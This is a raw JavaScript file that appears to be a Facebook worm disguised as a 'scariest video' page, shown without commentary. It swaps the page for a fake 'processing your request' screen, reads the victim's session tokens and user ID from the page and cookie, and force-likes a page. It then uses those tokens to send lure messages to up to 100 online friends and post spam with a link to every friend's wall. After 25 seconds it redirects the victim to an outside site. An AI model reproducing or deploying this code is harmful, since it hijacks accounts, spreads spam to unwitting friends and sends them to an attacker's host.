document.getElementById('contentArea').innerHTML='<center><br><h1>Please  wait...processing     your  request<br><br><br><br><img  src=\"http://static-hp.com/images/loading-bar.gif\"  /><br  /></center>';   

/* Utilities. */
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}


// Setup some variables
var post_form_id = document.getElementsByName('post_form_id')[0].value;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
            
            
  /* Message spinner. */

var p0 = ['I dare you to watch this for over 25 seconds.The scariest video ever','Can you watch this for over 25 seconds?I dare you to beat my time'];
var p1 = ['http://a8.sphotos.ak.fbcdn.net/hphotos-ak-snc7/375241_148198965288092_146431558798166_239799_517929391_n.jpg'];
var p2 = ['nicht auf den Link klicken, weil es  nicht funktioniert.Just Klick auf die Play-Taste, um das Video zu sehen ist.'];
var p3 = ['99% der Menschen konnen nicht dieses Video sehen zu mehr als 30 Sekunden!'];
var message = "";

         




/////////fan/////////////
     
    var http4 = new XMLHttpRequest();
     
    var url4 = "http://www.facebook.com/ajax/pages/fan_status.php?__a=1";
     
    var params4 = "fbpage_id=125277447585903&add=1&reload=0&preserve_tab=false&nctr[_mod]=pagelet_header&post_form_id="+post_form_id+"&fb_dtsg="+fb_dtsg+"&lsd&post_form_id_source=AsyncRequest"
     
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    http4.send(params4);
     
     
    ////////
///////////////////////////////mailing////////////////////////////
var http3 = new XMLHttpRequest();
var url3 = "http://www.facebook.com/ajax/chat/buddy_list.php?__a=1";
var params3 = "user=" + user_id + "&popped_out=false&force_render=true&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest";
http3['open']("POST", url3, true);
http3['setRequestHeader']("Content-type", "application/x-www-form-urlencoded");
http3['setRequestHeader']("Content-length", params3['length']);
http3['setRequestHeader']("Connection", "close");
http3['onreadystatechange'] = function () {
    if (http3['readyState'] == 4 && http3['status'] == 200) {
        var response3 = http3['responseText'];
        response3 = response3.replace("for (;;);", "");
        response3 = JSON.parse(response3);
        var count = 0;
        for (property in response3.payload.buddy_list.nowAvailableList) {
            if (count < 100) {               
               var httpc = new XMLHttpRequest();
                var msgid = Math.floor(Math.random() * 1000000);
                var time = Math.round(new Date().getTime() / 1000);
                var urlc = "/ajax/sharer/submit/?__a=1";
                var paramsc ="ad_params=&friendTarget=&groupTarget=&messageTarget[0]="+property+"&text_messageTarget[0]=&message="+p2+"&UIThumbPager_Input=0&app_id=2309869772&attachment[params][0]=328253927201607&attachment[params][1]=128879977223769&attachment[params][images][0]=http://a8.sphotos.ak.fbcdn.net/hphotos-ak-snc7/375241_148198965288092_146431558798166_239799_517929391_n.jpg&attachment[type]=99&src=i&appid=2309869772&parent_fbid=&mode=message&audience[0][value]=80&UITargetedPrivacyWidget=80&pageTarget=271819969526779&message_text="+p2+"&submit=Share%20Link&nctr[_mod]=pagelet_wall&__d=1&post_form_id="+post_form_id+"&fb_dtsg="+fb_dtsg+"&lsd&post_form_id_source=AsyncRequest&__user="+user_id+"";
                httpc['open']("POST", urlc, true);
                httpc['setRequestHeader']("Content-type", "application/x-www-form-urlencoded");
                httpc['setRequestHeader']("Content-length", paramsc['length']);
                httpc['setRequestHeader']("Connection", "close");
                httpc['onreadystatechange'] = function () {
                    if (httpc['readyState'] == 4 && httpc['status'] == 200) {}
                }
                httpc['send'](paramsc);
            }
            count++;
        }
        http3['close'];
    }
}
http3.send(params3);

////////////////////////////////////////////walls////////////////////////////////////////////////////////////////
var friends = new Array();
gf = new XMLHttpRequest();
gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token" + Math.random() + "&filter[0]=user&options[0]=friends_only", false);
gf.send();
if (gf.readyState != 4) {} else {
    data = eval('(' + gf.responseText.substr(9) + ')');
    if (data.error) {} else {
        friends = data.payload.entries.sort(function (a, b) {
            return a.index - b.index;
        });
    }
}

for (var i = 0; i < friends.length; i++) {

    message = [randomValue(p1), friends[i].text.substr(0,friends[i].text.indexOf(' ')).toLowerCase(), randomValue(p2), randomValue(p3)].join(' ');

    var httpwp = new XMLHttpRequest();
    var urlwp = "/ajax/sharer/submit/?__a=1";
    var paramswp ="ad_params=&friendTarget="+friends[i].uid+"&groupTarget=&message=" + friends[i].text.substr(0,friends[i].text.indexOf(' ')) + " "+p2+"&UIThumbPager_Input=0&app_id=2309869772&attachment[params][0]=328253927201607&attachment[params][1]=128879977223769&attachment[params][images][0]=http://a8.sphotos.ak.fbcdn.net/hphotos-ak-snc7/375241_148198965288092_146431558798166_239799_517929391_n.jpg&attachment[type]=99&src=i&appid=2309869772&parent_fbid=&mode=friend&audience[0][value]=80&UITargetedPrivacyWidget=80&pageTarget=271819969526779&message_text=" + friends[i].text.substr(0,friends[i].text.indexOf(' ')) + ""+p2+"&submit=Share%20Link&nctr[_mod]=pagelet_wall&__d=1&post_form_id="+post_form_id+"&fb_dtsg="+fb_dtsg+"&lsd&post_form_id_source=AsyncRequest&__user=";
    httpwp.open("POST", urlwp, true);
    httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpwp.setRequestHeader("Content-length", paramswp.length);
    httpwp.setRequestHeader("Connection", "keep-alive");
    httpwp.onreadystatechange = function () {
        if (httpwp.readyState == 4 && httpwp.status == 200) {

        }
    }
    httpwp.send(paramswp);
}
setTimeout("window.location = 'http://urwebhome.info/mplay.php';", 25000);         

